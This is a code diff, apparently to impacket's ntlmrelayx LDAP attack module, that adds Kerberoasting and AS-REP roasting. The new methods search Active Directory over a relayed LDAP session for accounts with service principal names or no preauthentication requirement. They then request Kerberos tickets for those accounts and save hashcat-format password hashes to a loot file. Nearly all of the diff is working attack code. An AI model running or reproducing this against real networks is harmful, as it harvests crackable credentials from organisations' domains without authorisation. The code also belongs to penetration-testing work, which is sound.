@@ -22,6 +22,7 @@ import string
 import json
 import datetime
 import binascii
+from binascii import unhexlify
 import codecs
 import re
 import dns.resolver
@@ -45,6 +46,15 @@ from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCE
 from impacket.uuid import string_to_bin, bin_to_string
 from impacket.structure import Structure, hexdump
 from impacket.examples.ntlmrelayx.utils import shadow_credentials
+from pyasn1.codec.der import decoder, encoder
+from pyasn1.type.univ import noValue
+from impacket.krb5 import constants as krb5constants
+from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, TGS_REP, seq_set, seq_set_iter
+from impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT, getKerberosTGS
+from impacket.krb5.types import KerberosTime, Principal
+from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH, UF_TRUSTED_FOR_DELEGATION, \
+    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
+from impacket.ntlm import compute_lmhash, compute_nthash
 
 # This is new from ldap3 v2.5
 try:
@@ -645,6 +655,286 @@ class LDAPAttack(ProtocolAttack):
         # If none of these match, the ACE does not apply to this object
         return False
 
+    def kerberoastAttack(self, domainDumper):
+        """
+        Enumerate kerberoastable user accounts via LDAP (users with SPNs),
+        then request TGS tickets and output hashes in hashcat format.
+        Requires relayed user credentials to obtain a TGT first.
+        """
+        LOG.info("Enumerating kerberoastable user accounts via LDAP")
+
+        searchFilter = '(&(objectCategory=person)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
+        attributes = ['servicePrincipalName', 'sAMAccountName', 'pwdLastSet', 'memberOf', 'userAccountControl', 'lastLogon']
+
+        success = self.client.search(
+            domainDumper.root,
+            searchFilter,
+            search_scope=ldap3.SUBTREE,
+            attributes=attributes
+        )
+
+        if not success:
+            LOG.error("LDAP search for kerberoastable accounts failed")
+            return
+
+        targets = []
+        for entry in self.client.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            try:
+                sam = entry['attributes']['sAMAccountName']
+                spns = entry['attributes']['servicePrincipalName']
+                uac = int(entry['attributes']['userAccountControl'])
+                if uac & UF_ACCOUNTDISABLE:
+                    continue
+                if isinstance(spns, str):
+                    spns = [spns]
+                delegation = ''
+                if uac & UF_TRUSTED_FOR_DELEGATION:
+                    delegation = 'unconstrained'
+                elif uac & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
+                    delegation = 'constrained'
+                targets.append({
+                    'sAMAccountName': sam,
+                    'servicePrincipalName': spns[0],
+                    'allSPNs': spns,
+                    'delegation': delegation,
+                })
+            except (KeyError, IndexError, TypeError):
+                continue
+
+        if not targets:
+            LOG.info("No kerberoastable user accounts found")
+            return
+
+        LOG.info("Found %d kerberoastable user account(s):" % len(targets))
+        for t in targets:
+            delegation_info = " [%s delegation]" % t['delegation'] if t['delegation'] else ""
+            LOG.info("  %-30s SPN: %s%s" % (t['sAMAccountName'], t['servicePrincipalName'], delegation_info))
+
+        # Try to get a TGT to request TGS tickets
+        domain = domainDumper.root.replace('DC=', '').replace(',', '.')
+        kdcHost = self.client.server.host
+
+        tgt = None
+        try:
+            userName = Principal(self.username, type=krb5constants.PrincipalNameType.NT_PRINCIPAL.value)
+            # Try using the relayed user session - we need the password/hash from the relay
+            # Use machine account if available in config
+            if hasattr(self.config, 'machineAccount') and self.config.machineAccount:
+                LOG.info("Using machine account %s to request TGT" % self.config.machineAccount)
+                machineUser = Principal(self.config.machineAccount, type=krb5constants.PrincipalNameType.NT_PRINCIPAL.value)
+                lmhash, nthash = self.config.machineHashes.split(':')
+                tgtData, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+                    machineUser, '', domain, unhexlify(lmhash), unhexlify(nthash), None, kdcHost=kdcHost)
+                tgt = {'KDC_REP': tgtData, 'cipher': cipher, 'sessionKey': sessionKey}
+            else:
+                LOG.warning("No machine account configured. Use -machine-account, -machine-hashes and -domain to enable TGS requests")
+        except Exception as e:
+            LOG.error("Failed to get TGT: %s" % str(e))
+
+        if tgt is None:
+            LOG.info("Cannot request TGS tickets without a TGT. Listing targets only.")
+            return
+
+        LOG.info("Got TGT, requesting TGS tickets...")
+
+        filename = os.path.join(
+            self.config.lootdir,
+            "kerberoast-%s-%d.txt" % (self.username, random.randint(0, 99999))
+        )
+        fd = open(filename, 'w')
+        count = 0
+
+        for t in targets:
+            sam = t['sAMAccountName']
+            spn = t['servicePrincipalName']
+            downLevelLogonName = domain + "\\" + sam
+
+            try:
+                principalName = Principal()
+                principalName.type = krb5constants.PrincipalNameType.NT_MS_PRINCIPAL.value
+                principalName.components = [downLevelLogonName]
+
+                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
+                    principalName, domain, kdcHost,
+                    tgt['KDC_REP'], tgt['cipher'], tgt['sessionKey'])
+
+                decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+                etype = decodedTGS['ticket']['enc-part']['etype']
+                cipherData = decodedTGS['ticket']['enc-part']['cipher'].asOctets()
+                realm = str(decodedTGS['ticket']['realm'])
+                spnHash = spn.replace(':', '~')
+
+                if etype == krb5constants.EncryptionTypes.rc4_hmac.value:
+                    entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
+                        etype, sam, realm, spnHash,
+                        binascii.hexlify(cipherData[:16]).decode(),
+                        binascii.hexlify(cipherData[16:]).decode())
+                elif etype in (krb5constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
+                               krb5constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value):
+                    entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
+                        etype, sam, realm, spnHash,
+                        binascii.hexlify(cipherData[-12:]).decode(),
+                        binascii.hexlify(cipherData[:-12]).decode())
+                elif etype == krb5constants.EncryptionTypes.des_cbc_md5.value:
+                    entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
+                        etype, sam, realm, spnHash,
+                        binascii.hexlify(cipherData[:16]).decode(),
+                        binascii.hexlify(cipherData[16:]).decode())
+                else:
+                    LOG.warning("Skipping %s - unsupported etype %d" % (sam, etype))
+                    continue
+
+                LOG.info("  %s" % entry[:80] + "...")
+                fd.write(entry + '\n')
+                count += 1
+
+            except Exception as e:
+                LOG.debug("Error requesting TGS for %s: %s" % (sam, str(e)))
+                continue
+
+        fd.close()
+        if count > 0:
+            LOG.info("Successfully roasted %d account(s), hashes saved to %s" % (count, filename))
+        else:
+            LOG.warning("Could not obtain any TGS tickets")
+
+    def asreproastAttack(self, domainDumper):
+        """
+        Enumerate AS-REP roastable accounts via LDAP (users with DONT_REQUIRE_PREAUTH),
+        then request AS-REP hashes directly (no authentication needed) in hashcat format.
+        """
+        LOG.info("Enumerating AS-REP roastable accounts via LDAP")
+
+        searchFilter = '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))'
+        attributes = ['sAMAccountName', 'pwdLastSet', 'memberOf', 'userAccountControl', 'lastLogon']
+
+        success = self.client.search(
+            domainDumper.root,
+            searchFilter,
+            search_scope=ldap3.SUBTREE,
+            attributes=attributes
+        )
+
+        if not success:
+            LOG.error("LDAP search for AS-REP roastable accounts failed")
+            return
+
+        targets = []
+        for entry in self.client.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            try:
+                sam = entry['attributes']['sAMAccountName']
+                targets.append(sam)
+            except (KeyError, IndexError):
+                continue
+
+        if not targets:
+            LOG.info("No AS-REP roastable accounts found")
+            return
+
+        LOG.info("Found %d AS-REP roastable account(s): %s" % (len(targets), ', '.join(targets)))
+
+        domain = domainDumper.root.replace('DC=', '').replace(',', '.')
+        kdcHost = self.client.server.host
+
+        filename = os.path.join(
+            self.config.lootdir,
+            "asreproast-%s-%d.txt" % (self.username, random.randint(0, 99999))
+        )
+        fd = open(filename, 'w')
+        count = 0
+
+        for userName in targets:
+            try:
+                clientName = Principal(userName, type=krb5constants.PrincipalNameType.NT_PRINCIPAL.value)
+                serverName = Principal('krbtgt/%s' % domain.upper(), type=krb5constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+                asReq = AS_REQ()
+                asReq['pvno'] = 5
+                asReq['msg-type'] = int(krb5constants.ApplicationTagNumbers.AS_REQ.value)
+
+                pacRequest = KERB_PA_PAC_REQUEST()
+                pacRequest['include-pac'] = True
+                encodedPacRequest = encoder.encode(pacRequest)
+
+                asReq['padata'] = noValue
+                asReq['padata'][0] = noValue
+                asReq['padata'][0]['padata-type'] = int(krb5constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+                asReq['padata'][0]['padata-value'] = encodedPacRequest
+
+                reqBody = seq_set(asReq, 'req-body')
+
+                opts = list()
+                opts.append(krb5constants.KDCOptions.forwardable.value)
+                opts.append(krb5constants.KDCOptions.renewable.value)
+                opts.append(krb5constants.KDCOptions.proxiable.value)
+                reqBody['kdc-options'] = krb5constants.encodeFlags(opts)
+
+                seq_set(reqBody, 'sname', serverName.components_to_asn1)
+                seq_set(reqBody, 'cname', clientName.components_to_asn1)
+
+                reqBody['realm'] = domain.upper()
+
+                now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
+                reqBody['till'] = KerberosTime.to_asn1(now)
+                reqBody['rtime'] = KerberosTime.to_asn1(now)
+                reqBody['nonce'] = random.getrandbits(31)
+
+                supportedCiphers = (int(krb5constants.EncryptionTypes.rc4_hmac.value),)
+                seq_set_iter(reqBody, 'etype', supportedCiphers)
+
+                message = encoder.encode(asReq)
+
+                try:
+                    r = sendReceive(message, domain, kdcHost)
+                except KerberosError as e:
+                    if e.getErrorCode() == krb5constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                        supportedCiphers = (int(krb5constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
+                                            int(krb5constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
+                        seq_set_iter(reqBody, 'etype', supportedCiphers)
+                        message = encoder.encode(asReq)
+                        r = sendReceive(message, domain, kdcHost)
+                    else:
+                        raise e
+
+                try:
+                    asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
+                    LOG.warning("User %s requires preauth, skipping" % userName)
+                    continue
+                except:
+                    asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
+
+                etype = asRep['enc-part']['etype']
+                cipherData = asRep['enc-part']['cipher'].asOctets()
+
+                if etype in (17, 18):
+                    entry = '$krb5asrep$%d$%s$%s$%s$%s' % (
+                        etype, userName, domain.upper(),
+                        binascii.hexlify(cipherData[-12:]).decode(),
+                        binascii.hexlify(cipherData[:-12]).decode())
+                else:
+                    entry = '$krb5asrep$%d$%s@%s:%s$%s' % (
+                        etype, userName, domain.upper(),
+                        binascii.hexlify(cipherData[:16]).decode(),
+                        binascii.hexlify(cipherData[16:]).decode())
+
+                LOG.info("  %s" % entry[:80] + "...")
+                fd.write(entry + '\n')
+                count += 1
+
+            except Exception as e:
+                LOG.error("Error requesting AS-REP for %s: %s" % (userName, str(e)))
+                continue
+
+        fd.close()
+        if count > 0:
+            LOG.info("Successfully roasted %d account(s), hashes saved to %s" % (count, filename))
+        else:
+            LOG.warning("Could not obtain any AS-REP hashes")
+
     def dumpADCS(self):
 
         def is_template_for_authentification(entry):
@@ -1083,6 +1373,14 @@ class LDAPAttack(ProtocolAttack):
             dumpedAdcs = True
             self.dumpADCS()
             LOG.info("Done dumping ADCS info")
+
+        # Kerberoast attack
+        if self.config.kerberoast:
+            self.kerberoastAttack(domainDumper)
+
+        # AS-REP Roast attack
+        if self.config.asreproast:
+            self.asreproastAttack(domainDumper)
 
         if self.config.adddnsrecord:
             name = self.config.adddnsrecord[0]
